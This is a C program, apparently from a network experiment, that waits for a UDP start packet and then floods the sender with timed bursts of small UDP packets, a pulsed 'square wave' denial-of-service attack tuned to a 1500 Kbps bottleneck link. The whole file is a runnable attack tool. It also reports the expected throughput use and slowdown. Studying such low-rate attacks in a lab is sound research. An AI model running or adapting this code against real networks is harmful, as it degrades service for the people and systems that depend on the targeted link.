#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <error.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define PORT 42000

/**
 * Waits to receive a datagram indicating that the attack
 * should start.
 * @return socket file descriptor connected to attacker's friend
 *         if no errors occur
 */
struct sockaddr_in waitForStartSignal() {
	int sockfd = socket(PF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0) {
		error(1, 0, "Error opening socket.\n");
	}

	struct sockaddr_in server_addr = {};
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = INADDR_ANY;
	server_addr.sin_port = htons(PORT);
	if (bind(sockfd, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0) {
		error(1, 0, "Error on binding\n");
	}
	
	printf("About to listen\n");
	listen(sockfd, 2);

	struct sockaddr_in cli_addr;
	int clilen = sizeof(cli_addr);
	char packet_buf[1500];

	// Receive a single message
	ssize_t bytes = recvfrom(sockfd, packet_buf, sizeof(packet_buf), 0, 
													 (struct sockaddr *) &cli_addr, &clilen);

	if (bytes < 0) {
		error(1, 0, "Error receiving packet.");
	}
	
	printf("Received a packet on port: %d and addr %s\n", ntohs(cli_addr.sin_port), inet_ntoa(cli_addr.sin_addr));

	close(sockfd);
	return cli_addr;
}


/**
 * Performs the square wave attack by targeting the given friend.  Continues * attack for approximately 1000 seconds or until killed.
 * 
 * @param period The period of the attack in milliseconds
 * @param length The length of one burst of the attack in milliseconds
 * @param friend_addr The address to send the square wave to.
 * @param link_rate The rate of the bottleneck link, in Kbps
 */ 
void perform_attack(int period, int length, struct sockaddr_in friend_addr,
									  int link_rate) {
 	// TODO:  Variable packet size?  For now all 50 byte packets

	int PACKET_SIZE = 50;
	int numpackets_burst = length * link_rate / PACKET_SIZE / 8;
	printf("Performing attack with period %dms, length %dms, rate %dKbps, and packets in bursts of size %d.\n", period, length, link_rate, numpackets_burst);
	double avg_throughput = ((double) length) / period * link_rate / 1000.0;
	printf("Average throughput used: %fMbps\n", avg_throughput);
	double impact = link_rate / 1000.0 * (link_rate / 1000.0 - avg_throughput);
	printf("Expected time increase just due to throughput use: %f\n", impact);
	int friend_sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
	
	char message[PACKET_SIZE - 28];
	for (int i = 0; i < sizeof(message); i++) {
		message[i] = 'h';
	}

	struct sockaddr_in my_addr;
	my_addr.sin_family = AF_INET;
	my_addr.sin_port = htons(PORT);
	my_addr.sin_addr.s_addr = INADDR_ANY;

	bind(friend_sock, (struct sockaddr*) &my_addr, sizeof(my_addr));

	for (int i = 0; i < 1000; i++) {
		for (int j = 0; j < numpackets_burst; j++) {
			int sockfd = 0;	
			ssize_t n = sendto(friend_sock, message, sizeof(message), 0, 
		  	                  (struct sockaddr *) &friend_addr, sizeof(friend_addr));
			if (n < 0) {
				error(1, 0, "Error writing to socket");
			}
			struct timespec req;
			req.tv_sec = 0;
			req.tv_nsec = length * (1000L * 1000) / numpackets_burst;
			nanosleep(&req, NULL);
		}

		struct timespec sleeptime;
		sleeptime.tv_sec = 0;
		sleeptime.tv_nsec = (period - length) * 1000L * 1000;
		int result = nanosleep(&sleeptime, NULL);
	}

}

int main(int argc, char* argv[]) {
	if (argc != 3) {
		error(1, 0, "Usage (uints of millis):  ./attacker period length");
	}

	int period = atoi(argv[1]);
	int length = atoi(argv[2]);

	struct sockaddr_in friend_addr = waitForStartSignal();
  perform_attack(period, length, friend_addr, 1500);	
}


